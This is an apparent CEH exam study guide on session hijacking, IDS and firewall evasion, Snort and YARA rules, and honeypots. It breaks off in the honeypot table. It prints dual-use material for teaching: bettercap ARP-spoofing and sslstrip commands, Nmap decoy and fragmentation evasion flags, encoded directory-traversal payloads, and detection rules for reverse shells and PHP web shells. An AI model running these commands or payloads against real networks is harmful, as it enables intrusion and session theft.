# CEH Exam Preparation: Day 4 — Domain 4 Part 2: Network and Perimeter Hacking (continued)

> Solving exercises will teach you more than you can think. Most of our knowledge comes from doing — and while doing you must solve problems, search for clues, and try different things; in this way you will learn rapidly.

This is Day 4 of your 7-day CEH preparation. Today you continue **Domain 4: Network and Perimeter Hacking**. Day 3 covered sniffing, enumeration, and network-level attacks. Today you focus on **Session Hijacking** and **Evading IDS, Firewalls, and Honeypots** — two critical areas that the CEH exam tests extensively.

---

## Recommended Schedule for Today (5-6 hours)

| Block | Duration | Activity |
|-------|----------|----------|
| Block 1 | 2 h | Study Session Hijacking — concepts, attack types, tools, countermeasures |
| Block 2 | 2.5 h | Study IDS/Firewall/Honeypot evasion — IDS types, firewall types, evasion techniques, Snort rules, YARA rules |
| Block 3 | 1 h | Review tables, practice exam-style questions, memorize Nmap evasion flags |

---

# Part 1: Session Hijacking

## 1.1 What Is Session Hijacking?

Session hijacking is the exploitation of a valid computer session — sometimes called a session key or token — to gain unauthorized access to information or services. The attacker takes over a legitimate user's session after the user has authenticated. This is different from session sniffing (passive observation) because hijacking involves active takeover.

**Key terminology:**

| Term | Definition |
|------|-----------|
| Session | A semi-permanent interactive information exchange between two communicating devices, established at a certain point and terminated at a later point |
| Session Token | A unique identifier (cookie, URL parameter, hidden form field) that the server uses to track authenticated users |
| Session ID | A specific type of session token, typically assigned after successful authentication |
| Spoofing | Pretending to be the legitimate user by forging the session identifier |
| Hijacking | Taking over an already-established session between a user and a server |

## 1.2 Application-Level vs. Network-Level Hijacking

Session hijacking operates at two distinct levels. The CEH exam frequently tests the distinction.

### Application-Level Session Hijacking

Application-level hijacking targets **HTTP sessions** — the attacker steals or predicts the session token (cookie, URL parameter) used by web applications to maintain state.

**Techniques:**

| Technique | Description |
|-----------|-------------|
| Session Token Sniffing | Capture session cookies over unencrypted HTTP using Wireshark or tcpdump |
| Session Token Prediction | Guess the next session ID by analyzing patterns in previously issued IDs |
| Session Fixation | Force the victim to use a session ID chosen by the attacker (detailed below) |
| Session Donation | Trick the victim into authenticating with the attacker's session ID, then use the authenticated session |
| XSS-based Theft | Inject JavaScript that sends document.cookie to an attacker-controlled server |
| CRIME Attack | Exploit TLS compression to recover session cookies (detailed below) |
| Man-in-the-Browser (MitB) | Trojan intercepts and manipulates web transactions in real-time from within the browser |

### Network-Level Session Hijacking

Network-level hijacking targets **TCP/IP sessions** — the attacker manipulates sequence numbers and injects packets into an ongoing TCP connection.

**Techniques:**

| Technique | Description |
|-----------|-------------|
| TCP/IP Hijacking (ISN Prediction) | Predict the Initial Sequence Number to inject packets into a TCP stream |
| RST Hijacking | Send a spoofed RST (reset) packet to terminate the victim's connection, then establish a new connection with the server |
| Blind Hijacking | Inject data into a TCP session without seeing the server's responses |
| UDP Hijacking | Forge UDP response packets to intercept communication (simpler than TCP — no sequence numbers) |
| MitM Hijacking | Position between client and server using ARP poisoning, then relay and modify traffic |

## 1.3 TCP/IP Hijacking — ISN Prediction (Deep Dive)

TCP uses a three-way handshake (SYN, SYN-ACK, ACK) to establish connections. Each side picks an **Initial Sequence Number (ISN)** that increments with each byte of data sent. If the attacker can predict the ISN, they can inject packets that appear to belong to the legitimate session.

**Attack flow:**

```
1. Attacker sniffs traffic between Client and Server
2. Attacker observes the TCP sequence numbers in use
3. Attacker sends a spoofed packet with:
   - Source IP = Client's IP
   - Correct sequence number (predicted or observed)
   - Payload containing attacker's commands
4. Server accepts the packet as part of the legitimate session
5. Attacker may send RST to the client to desynchronize it
```

**Why ISN prediction works:**
- Older TCP implementations used predictable ISN generation (incremental or time-based)
- Modern OS kernels use randomized ISNs, making this attack much harder
- The attacker must also be on the same network segment (or use ARP spoofing to see the traffic)

**Desynchronization attack:**
After hijacking, the attacker sends a large burst of null data to both sides to desynchronize their sequence numbers. Once the client and server have different sequence number expectations, the attacker can inject packets freely.

## 1.4 RST Hijacking

RST hijacking uses the TCP RST (reset) flag to forcefully terminate a connection:

```
1. Attacker monitors the TCP session between Client and Server
2. Attacker captures the current sequence number
3. Attacker sends a spoofed RST packet to the Server:
   - Source IP = Client's IP
   - Sequence number = next expected sequence number
4. Server terminates the connection with the Client
5. Attacker immediately establishes a new connection with the Server
   (possibly using the same source IP via spoofing)
```

**Key difference from ISN prediction:** RST hijacking terminates the existing session rather than injecting into it. The attacker must quickly establish a new session before the server times out.

## 1.5 Blind Hijacking

In blind hijacking, the attacker **cannot see the responses** from the server (the attacker is not on the same network segment and cannot sniff traffic). The attacker:

1. Predicts the TCP sequence numbers based on known ISN generation patterns
2. Injects packets into the session without confirmation of success
3. Can send commands but cannot read the output

This is the hardest form of session hijacking. It is "blind" because the attacker has no feedback loop — they send packets and hope the sequence numbers are correct.

## 1.6 UDP Hijacking

UDP is connectionless — there are no sequence numbers, no handshake, no connection state. This makes UDP hijacking **simpler** than TCP hijacking.

**Attack flow:**

```
1. Client sends a UDP request (e.g., DNS query) to the Server
2. Attacker, positioned on the network, sees the request
3. Attacker sends a forged UDP response before the real server responds
4. Client accepts the first response it receives (the forged one)
5. The real server's response arrives later and is discarded by the client
```

**Common target:** DNS queries (port 53). The attacker sends a forged DNS response with a malicious IP address. This is the basis of **DNS spoofing/cache poisoning**.

## 1.7 Session Fixation

Session fixation forces the victim to use a **session ID controlled by the attacker**.

**Attack flow:**

```
1. Attacker visits the target website and receives session ID: ABC123
2. Attacker crafts a URL with that session ID:
   https://bank.example.com/login?sessionid=ABC123
3. Attacker sends this URL to the victim (phishing, social engineering)
4. Victim clicks the link and authenticates on the website
5. The server now associates session ID ABC123 with the victim's account
6. Attacker uses session ID ABC123 to access the victim's authenticated session
```

**Why it works:**
- The server accepts session IDs provided in the URL or cookies
- The server does not regenerate the session ID after authentication
- The attacker already knows the session ID because they created it

**Countermeasure:** Regenerate the session ID after successful authentication. This is the single most effective defense against session fixation.

## 1.8 Session Donation

Session donation is the **reverse** of session fixation. Instead of forcing the victim to use the attacker's session ID to access the victim's account, the attacker tricks the victim into using the **attacker's authenticated session**.

**Attack flow:**

```
1. Attacker creates an account on target website (e.g., an e-commerce site)
2. Attacker authenticates and receives a valid session
3. Attacker forces the victim's browser to use the attacker's session cookie
   (via XSS, CSRF, or by setting cookies through a related subdomain)
4. Victim, now unknowingly using the attacker's session, enters sensitive data:
   - Credit card numbers
   - Addresses
   - Personal information
5. Attacker logs in with their own credentials and views the data the victim entered
```

**Example scenario:** The victim thinks they are shopping on their own account, but they are actually logged in as the attacker. When the victim enters their credit card to make a purchase, the credit card information is saved to the attacker's account.

## 1.9 CRIME Attack

**CRIME** (Compression Ratio Info-leak Made Easy) exploits TLS compression to recover secret cookies.

**How it works:**

```
1. The attacker controls part of the plaintext sent over TLS
   (e.g., by injecting JavaScript via a MitM proxy on HTTP pages)
2. TLS compression (DEFLATE) compresses the data before encryption
3. If the attacker's injected text matches part of the secret cookie,
   the compressed output is smaller
4. The attacker sends many requests, each time guessing one more
   character of the cookie
5. By observing the size of the encrypted response, the attacker can
   determine which guesses were correct (smaller = match found)
6. Character by character, the attacker recovers the full session cookie
```

**Variants:**
- **CRIME** — targets TLS-level compression
- **BREACH** — targets HTTP-level compression (gzip); works even when TLS compression is disabled
- **TIME** — timing-based variant of BREACH

**Countermeasure:** Disable TLS compression. Modern TLS libraries disable compression by default.

## 1.10 Man-in-the-Browser (MitB)

Man-in-the-Browser (MitB) is a sophisticated attack where a **Trojan horse** (often a browser extension or BHO — Browser Helper Object) modifies web pages and transaction content in real-time.

**How it differs from MitM:**

| Feature | Man-in-the-Middle | Man-in-the-Browser |
|---------|-------------------|---------------------|
| Position | Between client and server on the network | Inside the victim's browser |
| Encryption | Must break or bypass TLS | Operates after TLS decryption (inside the browser) |
| Detection | Network monitoring may detect anomalies | Very difficult to detect — content is modified at the DOM level |
| Examples | ARP spoofing, DNS spoofing | Zeus, SpyEye Trojans |

**Attack scenario:**
```
1. Victim's browser is infected with a banking Trojan (e.g., Zeus)
2. Victim logs into their bank and initiates a transfer of $100 to Account A
3. The Trojan intercepts the transaction INSIDE the browser
4. The Trojan modifies the request: $10,000 to the Attacker's Account B
5. The bank receives the modified request and processes it
6. The Trojan modifies the confirmation page shown to the victim:
   "Transfer of $100 to Account A — Success"
7. The victim sees a normal confirmation and suspects nothing
```

## 1.11 Session Hijacking Tools

| Tool | Purpose | Key Features |
|------|---------|-------------|
| **Burp Suite** | Web application security testing | Intercept/modify HTTP requests, session token analysis, cookie manipulation, Repeater for replaying modified requests |
| **bettercap** | Network attacks and MitM framework | ARP spoofing, DNS spoofing, HTTP/HTTPS proxy, session hijacking, Wi-Fi attacks; successor to Ettercap |
| **OWASP ZAP** | Web application security scanner | Automated scanning, session token analysis, active/passive scanning |
| **Ettercap** | MitM attacks on LAN | ARP poisoning, DNS spoofing, content filtering, plugin support |
| **Firesheep** (historical) | HTTP session cookie sniffing | Firefox extension that captured unencrypted session cookies on open Wi-Fi; drove adoption of HTTPS Everywhere |
| **Hamster and Ferret** | Session sidejacking | Ferret captures cookies; Hamster provides a proxy to use them |
| **DroidSheep** | Android session hijacking | Captures session cookies on Wi-Fi networks |

### Burp Suite for Session Analysis

Burp Suite is the most important tool for session hijacking on the CEH exam. Key features:

```
Burp Suite -> Proxy -> Intercept
- Intercept HTTP/HTTPS requests between browser and server
- View and modify session cookies in real-time
- Forward modified requests to the server

Burp Suite -> Sequencer
- Analyze the randomness of session tokens
- Collect tokens and run statistical tests
- Determine if session IDs are predictable

Burp Suite -> Repeater
- Replay captured requests with modified session tokens
- Test session fixation by replacing session IDs
- Verify if the server validates session tokens properly
```

### bettercap for Network-Level Hijacking

```bash
# Start bettercap
sudo bettercap -iface eth0

# Enable ARP spoofing to intercept traffic
> set arp.spoof.targets 192.168.1.100
> arp.spoof on

# Enable HTTP proxy to capture session cookies
> set http.proxy.sslstrip true
> http.proxy on

# Sniff HTTP cookies
> set net.sniff.filter "tcp port 80"
> net.sniff on
```

## 1.12 Session Hijacking Countermeasures

| Countermeasure | What It Prevents |
|----------------|-----------------|
| **Use HTTPS everywhere** | Prevents sniffing of session tokens in transit |
| **Regenerate session ID after login** | Prevents session fixation (the pre-login session ID becomes invalid) |
| **Set Secure flag on cookies** | Cookie is only sent over HTTPS, not HTTP |
| **Set HttpOnly flag on cookies** | Cookie cannot be accessed by JavaScript (prevents XSS-based theft) |
| **Set SameSite flag on cookies** | Prevents CSRF-based session hijacking (cookie not sent with cross-site requests) |
| **Implement session timeout** | Limits the window of opportunity for hijacking |
| **Bind session to client IP** | Session is invalidated if the client IP changes (may cause issues with mobile users) |
| **Use token-based authentication (JWT)** | Short-lived tokens with cryptographic signatures are harder to forge |
| **Disable TLS compression** | Prevents CRIME/BREACH attacks |
| **Encrypt session IDs in cookies** | Even if intercepted, the session ID cannot be reused without the encryption key |
| **Use anti-CSRF tokens** | Prevents cross-site request forgery |
| **Implement IPsec** | Encrypts and authenticates all IP traffic between hosts |

> **Exam tip:** When a question asks "what prevents session fixation?" the answer is almost always "regenerate the session ID after successful authentication." When it asks about preventing session sniffing, the answer is "use HTTPS" or "encrypt cookies."

---

# Part 2: Evading IDS, Firewalls, and Honeypots

## 2.1 Intrusion Detection Systems (IDS)

An IDS monitors network traffic or system activity for malicious behavior and raises alerts. An IDS **does not block traffic** — it only detects and reports. (An IPS blocks traffic.)

### IDS Types by Deployment

| Type | Full Name | What It Monitors | Placement |
|------|-----------|-----------------|-----------|
| **NIDS** | Network-based IDS | All network traffic on a segment | Inline or on a SPAN/mirror port on a switch |
| **HIDS** | Host-based IDS | Activity on a single host (file changes, logs, system calls) | Installed on individual servers or endpoints |

**NIDS examples:** Snort, Suricata, Zeek (formerly Bro)
**HIDS examples:** OSSEC, Tripwire, AIDE (Advanced Intrusion Detection Environment)

### IDS Detection Methods

| Method | How It Works | Strengths | Weaknesses |
|--------|-------------|-----------|------------|
| **Signature-based** (Knowledge-based) | Compares traffic against a database of known attack signatures (patterns) | Very accurate for known attacks; low false positives | Cannot detect zero-day attacks or novel attacks not in the database |
| **Anomaly-based** (Behavior-based) | Builds a baseline of "normal" traffic/behavior, then flags deviations | Can detect zero-day and novel attacks | Higher false positives; requires training period to establish baseline |
| **Protocol anomaly-based** | Checks if traffic conforms to protocol standards (RFCs) | Detects protocol violations used in attacks | May flag legitimate but non-standard implementations |
| **Stateful protocol analysis** | Tracks the state of network, transport, and application protocols | Deep inspection of protocol behavior | Resource-intensive |

> **Exam tip:** The CEH exam often asks: "Which IDS detection method can detect zero-day attacks?" The answer is **anomaly-based** (behavior-based). Signature-based can only detect attacks for which signatures exist.

### IDS vs. IPS

| Feature | IDS (Intrusion Detection System) | IPS (Intrusion Prevention System) |
|---------|----------------------------------|-----------------------------------|
| Action | Detects and alerts (passive) | Detects, alerts, AND blocks (active) |
| Placement | Out-of-band (SPAN port) or inline | Always inline (in the traffic path) |
| Impact of failure | No impact on traffic | May block legitimate traffic (false positive) or pass malicious traffic (false negative) |
| Latency | No added latency | Adds slight latency (must inspect each packet) |

## 2.2 Firewall Types

| Firewall Type | OSI Layer | Description | Limitations |
|---------------|-----------|-------------|------------|
| **Packet Filtering** | 3-4 (Network/Transport) | Examines packet headers (source/dest IP, port, protocol). Stateless — each packet evaluated independently. | Cannot inspect payload; no session awareness; vulnerable to fragmentation attacks |
| **Stateful Inspection** (Dynamic Packet Filtering) | 3-4 | Tracks connection state (SYN, SYN-ACK, ACK). Only allows packets that belong to established or related connections. | Cannot inspect application-layer content |
| **Circuit-Level Gateway** | 5 (Session) | Monitors TCP handshakes to determine if sessions are legitimate. Does not inspect individual packets after connection is established. | No content inspection; once connection is established, all traffic passes |
| **Application-Level Gateway** (Proxy Firewall) | 7 (Application) | Acts as a proxy — terminates client connection, inspects content, then makes a new connection to the server. Deep packet inspection. | Slower (must process each packet at Layer 7); needs separate proxy for each protocol |
| **WAF** (Web Application Firewall) | 7 (Application) | Specifically protects web applications by filtering HTTP/HTTPS traffic. Defends against OWASP Top 10. | Only protects web traffic; does not protect other protocols |
| **NGFW** (Next-Generation Firewall) | 3-7 | Combines traditional firewall with IPS, application awareness, deep packet inspection, SSL inspection, user identity integration, and threat intelligence. | More expensive; may have performance overhead from deep inspection |

### Packet Filtering Firewall Rules (Example)

```
Rule  Action  Source IP        Dest IP          Protocol  Src Port  Dst Port
----  ------  ---------------  ---------------  --------  --------  --------
1     ALLOW   192.168.1.0/24   ANY              TCP       ANY       80
2     ALLOW   192.168.1.0/24   ANY              TCP       ANY       443
3     ALLOW   ANY              192.168.1.10     TCP       ANY       22
4     DENY    ANY              ANY              ANY       ANY       ANY
```

Rules are evaluated **top-down**. The first matching rule is applied. Rule 4 is the **implicit deny** — any traffic not explicitly allowed is dropped.

> **Exam tip:** The CEH exam tests whether you understand that packet filtering firewalls are **stateless** — they evaluate each packet independently. A stateful firewall would track the TCP handshake and only allow response packets for established connections.

## 2.3 IDS/Firewall Evasion Techniques

This is one of the most heavily tested areas on the CEH exam. You must know each technique and how it works.

### Fragmentation

IP fragmentation splits a single IP packet into smaller fragments. Many IDS systems reassemble fragments differently than the target host, so the attack payload may not be detected.

```
Original packet (detected by IDS):
[IP Header][TCP Header][GET /etc/passwd HTTP/1.1]

Fragmented (may evade IDS):
Fragment 1: [IP Header][TCP He]
Fragment 2: [IP Header][ader][GET /e]
Fragment 3: [IP Header][tc/passwd]
Fragment 4: [IP Header][ HTTP/1.1]
```

The IDS must reassemble these fragments correctly to detect the attack. If the IDS reassembly logic differs from the target OS, the attack slips through.

**Overlapping fragments:** The attacker sends fragments that overlap. Different OS implementations handle overlaps differently (some favor the first fragment, some favor the last). The attacker crafts fragments so the target OS reassembles the malicious payload, while the IDS reassembles something benign.

### Session Splicing

Session splicing splits the attack payload across **multiple TCP segments** (not IP fragments — this is at the TCP layer). The IDS must reassemble the TCP stream to detect the attack.

```
TCP Segment 1: "GET "
TCP Segment 2: "/etc"
TCP Segment 3: "/pas"
TCP Segment 4: "swd "
TCP Segment 5: "HTTP/1.1"
```

If the IDS does not perform full TCP stream reassembly, it will not see the complete request.

### Unicode/Obfuscation Evasion

Encode the attack payload to bypass signature-based IDS rules.

| Encoding Method | Example Attack String | Encoded Version |
|----------------|----------------------|-----------------|
| URL encoding | /etc/passwd | /%65%74%63/%70%61%73%73%77%64 |
| Unicode encoding | ../ | ..%c0%af or ..%255c |
| Double URL encoding | /etc/passwd | %252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564 |
| Null byte injection | file.php | file.php%00.jpg |
| Case variation | SELECT | SeLeCt |
| Hex encoding | ' OR 1=1 | 0x27204f5220313d31 |

**IIS Unicode directory traversal (historical CVE-2000-0884):**
```
Normal:   GET /scripts/../../winnt/system32/cmd.exe
Blocked by IDS.

Unicode evasion:   GET /scripts/..%c0%af../winnt/system32/cmd.exe
The IDS does not decode %c0%af as '/' but IIS does — attack succeeds.
```

### TTL Manipulation

TTL (Time To Live) is decremented by 1 at each router. When TTL reaches 0, the packet is dropped. The attacker can exploit TTL to confuse the IDS:

```
                  Router        IDS         Target Server
                    |            |               |
Packet 1: TTL=3    |-->  TTL=2  |--> TTL=1  --> |  (arrives at server)
Packet 2: TTL=1    |-->  TTL=0  |  DROPPED       (never reaches server)
```

**Attack:**
```
1. Attacker sends a benign TCP segment (Packet A) with TTL high enough
   to reach the IDS but NOT the target (TTL expires before the target).
2. Attacker sends a malicious TCP segment (Packet B) with TTL high
   enough to reach both the IDS and the target.
3. The IDS sees both Packet A and Packet B and reassembles them into
   a benign stream.
4. The target only receives Packet B (the malicious one) because
   Packet A's TTL expired.
```

The IDS is tricked into seeing a different TCP stream than what the target actually receives.

### Decoy Scanning

Send packets from multiple spoofed IP addresses along with the real scan. The IDS sees scans from many IPs and cannot determine which one is the real attacker.

```bash
# Nmap decoy scan — use 5 decoys plus your real IP (ME)
nmap -D 10.0.0.1,10.0.0.2,10.0.0.3,10.0.0.4,10.0.0.5,ME 192.168.1.1

# Nmap decoy scan — use random decoys
nmap -D RND:10 192.168.1.1
```

The IDS logs show scan activity from 6 different IPs (5 decoys + the real scanner). The administrator cannot easily determine which IP is the actual attacker.

### IP Spoofing for Evasion

Set a fake source IP to hide the attacker's true identity:

```bash
# Using hping3 to send spoofed packets
hping3 -a 10.0.0.100 -S -p 80 192.168.1.1
# -a: set source IP to 10.0.0.100 (spoofed)
# -S: set SYN flag
# -p 80: target port 80
```

**Limitation:** With a spoofed source IP, the attacker cannot receive responses (they go to the spoofed IP). This works for DoS attacks and decoy scanning but not for establishing TCP connections.

## 2.4 Nmap Evasion Flags — Complete Reference

This table is critical for the CEH exam. Memorize these flags.

| Nmap Flag | Full Name / Purpose | How It Evades Detection |
|-----------|-------------------|------------------------|
| `-D decoy1,decoy2,...,ME` | Decoy scan | Sends packets from multiple spoofed IPs; real scan hidden among decoys |
| `-D RND:10` | Random decoy scan | Generates 10 random decoy IP addresses |
| `-T 0-5` | Timing template | -T0 (Paranoid): 5-minute delay between probes; -T1 (Sneaky): 15-second delay; -T2 (Polite): 0.4-second delay. Slower scans avoid IDS time-based detection thresholds |
| `-f` | Fragment packets | Splits probe packets into 8-byte IP fragments |
| `-ff` | Double fragmentation | Splits into 16-byte fragments |
| `--mtu value` | Set specific MTU | Control exact fragment size (must be multiple of 8) |
| `-sA` | ACK scan | Sends ACK packets — used to map firewall rules. Stateless firewalls that only filter SYN will allow ACK packets through. Cannot determine if port is open, but can determine if it is filtered or unfiltered |
| `-sF` | FIN scan | Sends FIN flag only. Open ports silently drop FIN (no response); closed ports respond with RST. Evades firewalls that only look for SYN |
| `-sN` | NULL scan | Sends packets with no flags set. Same logic as FIN scan — relies on RFC 793 behavior |
| `-sX` | Xmas scan | Sets FIN, PSH, URG flags. Same evasion logic. Called "Xmas" because the flags light up like a Christmas tree |
| `--source-port port` or `-g port` | Spoof source port | Set source port to 53 (DNS) or 80 (HTTP) — firewalls often allow traffic from these ports |
| `-S IP` | Spoof source IP | Set a fake source IP address |
| `--data-length num` | Append random data | Adds random bytes to packets to change their size and evade size-based signatures |
| `--randomize-hosts` | Randomize target order | Scans hosts in random order to avoid sequential scan detection |
| `--spoof-mac MAC` | Spoof MAC address | Use a fake MAC; 0 for random, or specify a vendor prefix |
| `--badsum` | Send bad checksums | Packets with bad checksums should be dropped by the host but may be processed by IDS (used to detect IDS/IPS presence) |
| `--scan-delay time` | Delay between probes | Add specific delay between probes (e.g., --scan-delay 5s) |
| `-sI zombie` | Idle scan | Use a zombie host to scan — completely blind scan that reveals no information about the attacker's IP |

### Common Nmap Evasion Command Examples

```bash
# Slow scan with fragmentation through a specific source port
nmap -T1 -f --source-port 53 192.168.1.1

# ACK scan to map firewall rules (find unfiltered ports)
nmap -sA -p 1-1024 192.168.1.1

# Xmas scan with decoys and random data
nmap -sX -D RND:5 --data-length 50 192.168.1.1

# Idle scan using zombie host 10.0.0.50
nmap -sI 10.0.0.50 192.168.1.1

# Full evasion: slow, fragmented, spoofed source port, random MAC
nmap -T2 -f --source-port 80 --spoof-mac 0 --randomize-hosts 192.168.1.0/24
```

> **Exam tip:** The ACK scan (-sA) does NOT determine if a port is open or closed. It only determines if a port is **filtered** (no response or ICMP unreachable) or **unfiltered** (RST response). It is used to map firewall rulesets.

> **Exam tip:** FIN, NULL, and Xmas scans (-sF, -sN, -sX) only work against systems that follow RFC 793. **Windows does not follow RFC 793** — it sends RST for both open and closed ports, making these scans unreliable against Windows targets.

## 2.5 Firewalking

**Firewalking** is a technique to determine which ports a firewall allows through by sending packets with a TTL that expires one hop past the firewall.

**How it works:**

```
Attacker -----> Router -----> Firewall -----> Target Server
                                 |
                                 | TTL = 1 when packet arrives here
                                 |
                If firewall ALLOWS the packet:
                  Packet passes through, TTL expires at next hop
                  -> Attacker receives "ICMP Time Exceeded" from the next hop
                  -> Port is OPEN through the firewall

                If firewall BLOCKS the packet:
                  Packet is dropped, no response
                  -> Attacker receives nothing
                  -> Port is FILTERED/BLOCKED by the firewall
```

**Steps:**
1. First, use traceroute to determine the number of hops to the firewall
2. Set TTL = hops_to_firewall + 1
3. Send packets to different ports with this TTL
4. If you receive "ICMP Time Exceeded" — the port is allowed through the firewall
5. If you receive nothing — the port is blocked

**Tool:** firewalk

```bash
# Firewalk scan — gateway at 10.0.0.1, target at 10.0.0.100
firewalk -S 1-1024 -i eth0 -n -pTCP 10.0.0.1 10.0.0.100
```

## 2.6 Snort — Network IDS/IPS

**Snort** is the most widely deployed open-source NIDS/IPS. It uses **signature-based** detection with optional anomaly detection. The CEH exam tests Snort rule syntax.

### Snort Modes

| Mode | Command | Description |
|------|---------|-------------|
| Sniffer | `snort -v` | Displays packet headers on the console |
| Packet Logger | `snort -l /var/log/snort` | Logs packets to disk |
| NIDS | `snort -c /etc/snort/snort.conf` | Runs as a network IDS using rules |

### Snort Rule Syntax — Complete Breakdown

A Snort rule has two parts: the **rule header** and the **rule options**.

```
[Action] [Protocol] [Source IP] [Source Port] -> [Dest IP] [Dest Port] (Rule Options)
```

**Rule header fields:**

| Field | Values | Description |
|-------|--------|-------------|
| Action | alert, log, pass, drop, reject, sdrop | What to do when the rule matches. alert = generate alert and log. drop = block and log (IPS mode). reject = block, log, and send RST/ICMP unreachable. sdrop = block silently (no log). |
| Protocol | tcp, udp, icmp, ip | Network protocol to match |
| Source IP | IP address, CIDR, any, $HOME_NET, $EXTERNAL_NET | Source IP address or network. Variables like $HOME_NET are defined in snort.conf |
| Source Port | Port number, range, any | Source port |
| Direction | -> (unidirectional), <> (bidirectional) | Traffic direction |
| Dest IP | Same as Source IP | Destination IP address or network |
| Dest Port | Same as Source Port | Destination port |

**Rule options** (inside parentheses, separated by semicolons):

| Option | Description | Example |
|--------|-------------|---------|
| msg | Alert message displayed when rule triggers | msg:"SQL Injection attempt"; |
| content | Pattern to match in the packet payload (case-sensitive by default) | content:"SELECT"; |
| nocase | Make the preceding content match case-insensitive | content:"select"; nocase; |
| sid | Snort rule ID (unique identifier). <100 = reserved; 100-999999 = official; >=1000000 = user-defined | sid:1000001; |
| rev | Rule revision number | rev:1; |
| classtype | Attack classification | classtype:web-application-attack; |
| priority | Rule priority (1 = highest) | priority:1; |
| flow | Track flow state | flow:established,to_server; |
| offset | Start content search at byte offset | offset:0; |
| depth | Search only within N bytes from offset | depth:50; |
| pcre | Perl-Compatible Regular Expression | pcre:"/union.*select/i"; |
| flags | TCP flags to match | flags:SF; (SYN+FIN) |
| threshold | Rate limiting — alert only after N events in T seconds | threshold:type threshold, track by_src, count 5, seconds 60; |
| reference | External reference (CVE, URL) | reference:cve,2021-44228; |

### Snort Rule Examples

**Example 1: Detect ICMP ping**
```
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Detected"; sid:1000001; rev:1;)
```
Breakdown:
- alert — generate an alert
- icmp — match ICMP protocol
- any any — from any source IP, any source port
- -> — unidirectional (inbound)
- $HOME_NET any — to our network, any port
- msg:"ICMP Ping Detected" — alert message
- sid:1000001 — unique rule ID
- rev:1 — revision 1

**Example 2: Detect SQL injection in HTTP traffic**
```
alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:"SQL Injection - UNION SELECT detected"; flow:established,to_server; content:"union"; nocase; content:"select"; nocase; distance:0; sid:1000002; rev:1; classtype:web-application-attack; priority:1;)
```
Breakdown:
- flow:established,to_server — only inspect established TCP connections going to the server
- content:"union"; nocase; — look for "union" (case-insensitive)
- content:"select"; nocase; distance:0; — then look for "select" (case-insensitive) anywhere after the first match

**Example 3: Detect Nmap Xmas scan**
```
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"Nmap Xmas Scan Detected"; flags:FPU; sid:1000003; rev:1; classtype:attempted-recon; priority:2;)
```
- flags:FPU — match packets with FIN, PSH, and URG flags set (Xmas scan)

**Example 4: Detect SSH brute force (more than 5 attempts in 60 seconds)**
```
alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"SSH Brute Force Attempt"; flow:established,to_server; content:"SSH"; depth:4; threshold:type threshold, track by_src, count 5, seconds 60; sid:1000004; rev:1; classtype:attempted-admin; priority:1;)
```

**Example 5: Detect directory traversal**
```
alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:"Directory Traversal Attempt"; flow:established,to_server; content:"../"; sid:1000005; rev:1; classtype:web-application-attack;)
```

**Example 6: Detect reverse shell connection (outbound to attacker)**
```
alert tcp $HOME_NET any -> $EXTERNAL_NET 4444 (msg:"Possible Reverse Shell to Port 4444"; flow:established,to_server; sid:1000006; rev:1; classtype:trojan-activity; priority:1;)
```

> **Exam tip:** Learn to read Snort rules. The exam may show you a rule and ask what it detects, or ask you to identify which rule would detect a given attack. Focus on the msg, content, flags, and flow options.

## 2.7 YARA Rules

**YARA** is a tool for identifying and classifying malware by pattern matching. YARA rules describe patterns found in malware samples — strings, hex patterns, regular expressions, and conditions.

### YARA Rule Syntax

```
rule RuleName
{
    meta:
        description = "Description of what this rule detects"
        author = "Your Name"
        date = "2026-03-14"
        severity = "high"

    strings:
        $string1 = "malicious_string"
        $string2 = { 4D 5A 90 00 }        // hex pattern (MZ header)
        $string3 = /regex_pattern/          // regular expression
        $wide_string = "password" wide      // UTF-16 (wide) string
        $nocase_str = "admin" nocase        // case-insensitive

    condition:
        $string1 or ($string2 and $string3) or any of ($wide_string, $nocase_str)
}
```

### YARA Rule Components

| Component | Description | Example |
|-----------|-------------|---------|
| rule | Rule name (identifier) | rule Detect_Trojan |
| meta | Metadata (descriptive, not used in matching) | description = "Detects Zeus banking trojan" |
| strings | Patterns to search for | $s1 = "cmd.exe" |
| condition | Logic that determines when the rule matches | any of them |

### Condition Keywords

| Keyword | Meaning | Example |
|---------|---------|---------|
| and | Both conditions must be true | $s1 and $s2 |
| or | Either condition can be true | $s1 or $s2 |
| not | Negation | not $s1 |
| any of them | Any defined string matches | any of them |
| all of them | All defined strings match | all of them |
| N of them | At least N strings match | 2 of them |
| filesize | File size condition | filesize < 500KB |
| at | String at specific offset | $s1 at 0 |
| in | String in range | $s1 in (0..1024) |
| uint16(0) == 0x5A4D | Check specific bytes at offset | PE file check (MZ header) |

### YARA Rule Examples

**Example 1: Detect a web shell**
```
rule WebShell_Detection
{
    meta:
        description = "Detects common PHP web shells"
        author = "SOC Analyst"

    strings:
        $php_tag = "<?php"
        $eval = "eval(" nocase
        $base64 = "base64_decode" nocase
        $system = "system(" nocase
        $passthru = "passthru(" nocase
        $shell_exec = "shell_exec(" nocase

    condition:
        $php_tag and (
            ($eval and $base64) or
            $system or $passthru or $shell_exec
        )
}
```

**Example 2: Detect a PE file with suspicious strings**
```
rule Suspicious_PE
{
    meta:
        description = "Detects PE files with suspicious API calls"

    strings:
        $mz = { 4D 5A }                  // MZ header
        $api1 = "VirtualAlloc" nocase
        $api2 = "WriteProcessMemory" nocase
        $api3 = "CreateRemoteThread" nocase

    condition:
        $mz at 0 and all of ($api*)
}
```

### yarGen

**yarGen** is a tool that automatically generates YARA rules by analyzing malware samples and extracting unique strings that differentiate them from legitimate software.

```bash
# Generate YARA rules from malware samples
python yarGen.py -m /path/to/malware/samples -o generated_rules.yar

# Update yarGen's database of legitimate strings
python yarGen.py --update
```

yarGen maintains a database of strings found in legitimate software (goodware strings). It extracts strings from malware samples and removes any strings that also appear in legitimate software, leaving only unique indicators.

## 2.8 Honeypots

A **honeypot** is a deliberately vulnerable system designed to attract attackers. It has no production value — any traffic to the honeypot is suspicious by definition.

### Honeypot Types

| Type | Interaction Level | Purpose | Examples |
|------|-------------------|---------|----------|
| **Low-interaction** | Emulates services (limited responses) | Detect port scans and automated attacks | Honeyd, KFSensor, Dionaea |
| **Medium-interaction** | Emulates more complex responses | Capture malware samples, study attack patterns | Cowrie (SSH), Conpot (ICS/SCADA) |
